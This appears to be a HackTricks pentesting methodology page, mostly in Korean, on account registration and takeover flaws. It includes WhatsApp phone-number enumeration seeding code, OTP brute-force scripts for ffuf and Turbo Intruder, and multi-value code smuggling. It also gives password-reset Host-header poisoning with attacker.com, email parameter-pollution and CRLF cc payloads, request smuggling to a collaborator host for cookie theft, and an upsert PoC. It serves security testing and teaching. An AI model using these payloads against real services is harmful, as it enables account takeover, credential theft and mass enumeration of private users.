# 등록 및 탈취 취약점

{{#include ../banners/hacktricks-training.md}}

## 등록 탈취

### 중복 등록

- 기존 사용자 이름을 사용해 계정을 생성해 보세요
- 이메일 변형 확인:
- 대문자/소문자 변경
- +1@
- 이메일에 점(.) 추가
- 이메일 로컬파트에 특수문자 사용 (%00, %09, %20)
- 이메일 뒤에 공백 문자 추가: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- 이메일 제공자 정규화(canonicalization) 우회 시도 (서비스에 따라 다름):
- Gmail은 점과 서브어드레싱을 무시합니다: `victim+1@gmail.com`, `v.ic.tim@gmail.com`는 victim@gmail.com으로 배달됩니다
- 일부 제공업체는 로컬파트에서 대소문자 구분을 하지 않습니다
- 일부 제공업체는 유니코드 혼동 문자(unicode confusables)를 허용합니다. 로컬파트에 homoglyphs와 soft hyphen `\u00AD`를 시도해보세요
- 이를 악용해: uniqueness 검사 우회, 중복 계정/워크스페이스 초대 획득, 또는 탈취 준비 중 피해자 가입 차단(일시적 DoS)

### 사용자명 열거

애플리케이션 내에서 특정 사용자명이 이미 등록되었는지 알아낼 수 있는지 확인하세요.

- 서로 다른 에러 메시지 또는 HTTP 상태 코드
- 타이밍 차이(기존 사용자는 IdP/DB 조회를 유발할 수 있음)
- 알려진 이메일에 대한 등록 폼의 프로필 데이터 자동완성
- 팀/초대 흐름 확인: 이메일 입력 시 계정 존재 여부를 드러낼 수 있음

### 비밀번호 정책

사용자 생성 시 비밀번호 정책을 확인하세요(약한 비밀번호 사용 가능 여부 확인).  
그럴 경우 인증 정보를 bruteforce 시도할 수 있습니다.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)에서 registry 폼에서 **SQL Injections**을 통해 계정 탈취를 시도하거나 정보를 추출하는 방법을 배우세요.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### 이메일 변경

등록된 후 이메일을 변경해보고, 변경이 올바르게 검증되는지 또는 임의의 이메일로 변경할 수 있는지 확인하세요.

### 추가 점검 사항

- **일회용 이메일** 사용 가능 여부 확인(mailinator, yopmail, 1secmail 등) 또는 `victim+mailinator@gmail.com`처럼 서브어드레싱으로 블랙리스트 우회
- **긴** **비밀번호** (>200)는 **DoS**를 초래할 수 있음
- **계정 생성에 대한 속도 제한 확인**
- username@**burp_collab**.net을 사용하고 **콜백**을 분석하세요
- 전화번호 인증이 사용되는 경우, 전화번호 파싱/주입의 엣지 케이스 확인

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### 연락처 탐지 / 식별자 열거 오라클

전화번호 중심 메신저는 클라이언트가 연락처를 동기화할 때마다 **presence oracle**을 노출합니다. WhatsApp의 discovery 요청을 재생하면 과거에 **>100M lookups per hour**를 달성하여 거의 완전한 계정 열거가 가능했습니다.

**공격 워크플로우**

1. **공식 클라이언트를 계측(instrument)** 하여 주소록 업로드 요청(정규화된 E.164 번호의 인증된 블롭)을 캡처합니다. 같은 쿠키/디바이스 토큰을 재사용하면서 공격자가 생성한 번호로 재생하세요.
2. **요청당 번호를 배치**하세요: WhatsApp은 수천 개의 식별자를 받아 등록/미등록 및 메타데이터(비즈니스, companion 등)를 반환합니다. 피해자에게 메시지를 보내지 않고도 응답을 오프라인으로 분석해 타깃 리스트를 구축하세요.
3. **수평 확장(Horizontally scale)**: SIM 뱅크, 클라우드 디바이스, 또는 리지덴셜 프록시로 열거를 확장해 계정/IP/ASN별 쓰로틀링이 발생하지 않도록 하세요.

다이얼링 플랜 모델링

각 국가의 다이얼링 플랜을 모델링하여 유효하지 않은 후보를 건너뛰세요. NDSS 데이터셋(`country-table.*`)은 국가 코드, 채택 밀도, 플랫폼 분할을 나열하므로 적중률이 높은 범위를 우선순위로 둘 수 있습니다. 예시 시딩 코드:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Prioritise prefixes that match real allocations (Mobile Country Code + National Destination Code) before querying the oracle to keep throughput useful.

**Turning enumerations into targeted attacks**

- Feed leaked phone numbers (e.g., Facebook’s 2021 breach) into the oracle to learn which identities are still active before phishing, SIM-swapping, or spamming.
- 국가/OS/앱 유형별로 censuses를 분할하여 SMS 필터링이 약한 지역이나 WhatsApp Business 채택이 높은 지역을 찾아 localized social engineering을 노리세요.

**Public-key reuse correlation**

WhatsApp exposes each account’s X25519 identity key during session setup. 모든 enumerated 번호에 대해 identity material을 요청하고 공개 키를 중복 제거하면 account farms, 클론된 클라이언트, 또는 불안정한 펌웨어를 식별할 수 있습니다—공유 키는 multi-SIM 운영의 익명성을 제거합니다.

## Weak Email/Phone Verification (OTP/Magic Link)

Registration flows often verify ownership via a numeric OTP or a magic-link token. Typical flaws:

- 추측 가능하거나 짧은 OTP (4–6 digits)에 효과적인 rate limiting이나 IP/디바이스 추적이 없는 경우. parallel guesses 및 header/IP rotation을 시도하세요.
- OTP가 액션이나 계정 간에 재사용되거나 특정 사용자/액션에 바인딩되지 않음(예: 동일한 코드가 login과 signup에 모두 동작하거나 이메일 변경 후에도 동작).
- Multi-value smuggling: 일부 백엔드는 여러 코드를 허용하고 그중 어느 하나라도 일치하면 검증합니다. 시도해볼 것:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: 상태/메시지/본문 길이로 wrong vs expired vs wrong-user 코드를 구분하세요.
- 토큰이 성공 후나 비밀번호/이메일 변경 후에 무효화되지 않음.
- Verification token이 user agent/IP에 묶여 있지 않아 공격자 제어 페이지에서 cross-origin 완료가 가능함.

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
순차적 잠금(sequential lockouts)을 우회하기 위한 병렬/동시 대입 시도 (Turbo Intruder in Burp 사용):

<details>
<summary>6‑digit OTP 대량 시도를 위한 Turbo Intruder 스니펫</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: 동일한 유효한 OTP를 두 세션에서 동시에 제출하세요; 경우에 따라 한 세션은 확인된 공격자 계정이 되고 피해자 흐름도 성공할 수 있습니다.
- 또한 verification 링크에서 Host header poisoning을 테스트하세요(아래의 reset poisoning과 동일). 공격자가 제어하는 호스트에서 verification을 leak하거나 완료할 수 있는지 확인합니다.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

공격자가 피해자가 계정을 생성하기 전에 피해자의 이메일에 대해 조작을 수행하고, 이후에 다시 접근 권한을 획득하는 경우 강력한 취약점 클래스가 발생합니다.

Key techniques to test (adapt to the target’s flows):

- Classic–Federated Merge
  - 공격자: 피해자 이메일로 classic 계정을 등록하고 비밀번호를 설정합니다.
  - 피해자: 이후 동일 이메일로 SSO로 가입합니다.
  - 불안전한 병합은 양쪽이 모두 로그인된 상태로 남거나 공격자의 접근이 부활할 수 있습니다.
- Unexpired Session Identifier
  - 공격자: 계정을 생성하고 장기 세션을 유지합니다(로그아웃하지 않음).
  - 피해자: 비밀번호를 복구/설정하고 계정을 사용합니다.
  - 리셋이나 MFA 활성화 후에도 이전 세션이 유효한지 확인하세요.
- Trojan Identifier
  - 공격자: 미리 생성된 계정에 2차 식별자(전화번호, 추가 이메일 또는 공격자의 IdP 연동)를 추가합니다.
  - 피해자: 비밀번호를 재설정합니다; 이후 공격자가 trojan identifier를 사용해 재설정/로그인합니다.
- Unexpired Email Change
  - 공격자: 이메일 변경을 공격자 메일로 시작하고 확인을 보류합니다.
  - 피해자: 계정을 복구하고 사용하기 시작합니다.
  - 공격자: 이후 보류 중인 이메일 변경을 완료해 계정을 탈취합니다.
- Non‑Verifying IdP
  - 공격자: 이메일 소유권을 검증하지 않는 IdP를 사용해 `victim@…`을 주장합니다.
  - 피해자: classic 경로로 가입합니다.
  - 서비스가 `email_verified`를 확인하거나 로컬 검증을 수행하지 않고 이메일 기반 병합을 하면 문제가 발생합니다.

Practical tips

- web/mobile 번들에서 흐름과 엔드포인트를 수집하세요. classic signup, SSO linking, email/phone change, password reset 엔드포인트를 찾아보세요.
- 다른 흐름을 테스트하는 동안 세션을 유지하도록 현실적인 자동화를 만드세요.
- SSO 테스트의 경우, 테스트용 OIDC provider를 준비하고 피해자 주소의 `email` 클레임과 `email_verified=false`인 토큰을 발급해 RP가 미검증 IdP를 신뢰하는지 확인하세요.
- 비밀번호 재설정이나 이메일 변경 후에는 다음을 확인하세요:
  - 모든 다른 세션과 토큰이 무효화되는지,
  - 보류 중인 이메일/전화번호 변경 기능이 취소되는지,
  - 이전에 연동된 IdPs/이메일/전화번호가 재검증되는지.

Note: Extensive methodology and case studies of these techniques are documented by Microsoft’s pre‑hijacking research (see References at the end).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. 자신의 이메일 주소로 password reset을 요청합니다.
2. password reset 링크를 클릭합니다.
3. 비밀번호를 변경하지 않습니다.
4. 임의의 제3자 웹사이트(예: Facebook, twitter)를 클릭합니다.
5. Burp Suite 프록시에서 요청을 가로챕니다.
6. referer 헤더가 password reset token을 leak하고 있는지 확인합니다.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Burp Suite에서 password reset 요청을 가로챕니다.
2. Burp Suite에서 다음 헤더를 추가하거나 편집합니다: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. 수정한 헤더로 요청을 전달합니다\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. _host header_를 기반으로 한 password reset URL(예: `https://attacker.com/reset-password.php?token=TOKEN`)이 생성되는지 확인합니다.

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### API 파라미터에서의 IDOR <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. 공격자는 자신의 계정으로 로그인하여 **Change password** 기능으로 이동해야 합니다.
2. Burp Suite를 실행하고 요청을 Intercept 하세요
3. Repeater 탭으로 전송한 뒤 파라미터를 수정하세요 : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### 약한 비밀번호 재설정 토큰 <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

비밀번호 재설정 토큰은 매번 무작위로 생성되고 고유해야 합니다.\
토큰이 만료되는지 또는 항상 동일한지 확인해보세요. 일부 경우 생성 알고리즘이 약해서 추측될 수 있습니다. 알고리즘에 사용될 수 있는 변수는 다음과 같습니다.

- 타임스탬프
- UserID
- 사용자 이메일
- 이름과 성
- 생년월일
- 암호화
- 숫자만
- 작은 토큰 시퀀스 ( 문자는 \[A-Z,a-z,0-9] 사이)
- 토큰 재사용
- 토큰 만료 날짜

### Leaking 비밀번호 재설정 토큰 <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. 특정 이메일에 대해 API/UI를 사용해 비밀번호 재설정 요청을 트리거합니다. 예: test@mail.com
2. 서버 응답을 검사하고 `resetToken`을 확인하세요
3. 그런 다음 토큰을 다음과 같은 URL에 사용하세요: `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### 사용자명 충돌을 통한 비밀번호 재설정 <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. 피해자와 동일한 사용자명으로 시스템에 등록하되 사용자명 앞뒤에 공백을 추가합니다. 예: `"admin "`
2. 악의적인 사용자명으로 비밀번호 재설정을 요청하세요.
3. 자신의 이메일로 전송된 토큰을 사용해 피해자의 비밀번호를 재설정하세요.
4. 새 비밀번호로 피해자 계정에 로그인하세요.

CTFd 플랫폼은 이 공격에 취약했습니다.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Cross Site Scripting을 통한 계정 탈취 <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. 애플리케이션 내부나 서브도메인에서 XSS를 찾습니다. (쿠키가 상위 도메인으로 스코프된 경우: `*.domain.com`)
2. 현재 **sessions cookie**를 leak 하세요
3. 해당 쿠키로 사용자로 인증하세요

### HTTP Request Smuggling을 통한 계정 탈취 <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. HTTP Request Smuggling의 유형(C L, TE, CL.TE)을 탐지하기 위해 **smuggler**를 사용하세요\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. 다음 데이터로 `POST / HTTP/1.1`을 덮어쓸 요청을 조작하세요:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` — 목표는 피해자를 burpcollab으로 open redirect 시켜 쿠키를 훔치는 것입니다\
3. 최종 요청은 다음과 같이 보일 수 있습니다
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone에서 이 버그를 악용한 보고서\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### CSRF를 통한 계정 탈취 <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. CSRF용 payload를 생성합니다. 예: “HTML form with auto submit for a password change”
2. payload를 전송합니다.

### JWT를 통한 계정 탈취 <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token은 사용자 인증에 사용될 수 있습니다.

- JWT의 User ID / Email을 다른 것으로 수정합니다.
- 약한 JWT 서명 여부를 확인합니다.


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (기존 이메일에 대한 Upsert)

일부 signup 핸들러는 제공된 email이 이미 존재할 경우 upsert를 수행합니다. 만약 endpoint가 email과 password만 포함한 최소한의 body를 허용하고 소유권 확인을 강제하지 않는다면, 피해자의 email을 전송하여 인증 이전에 그들의 password를 덮어쓸 수 있습니다.

- 탐지: bundled JS(또는 모바일 앱 트래픽)에서 endpoint 이름을 수집한 다음, ffuf/dirsearch를 사용해 /parents/application/v4/admin/FUZZ 같은 기본 경로를 fuzz합니다.
- 단서: GET이 "Only POST request is allowed." 같은 메시지를 반환하면 종종 올바른 HTTP verb와 JSON body가 기대된다는 의미입니다.
- 실제에서 관찰된 최소 body:
```json
{"email":"victim@example.com","password":"New@12345"}
```
예제 PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
영향: reset token, OTP 또는 이메일 검증 없이 Full Account Takeover (ATO) 가능.

## References

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
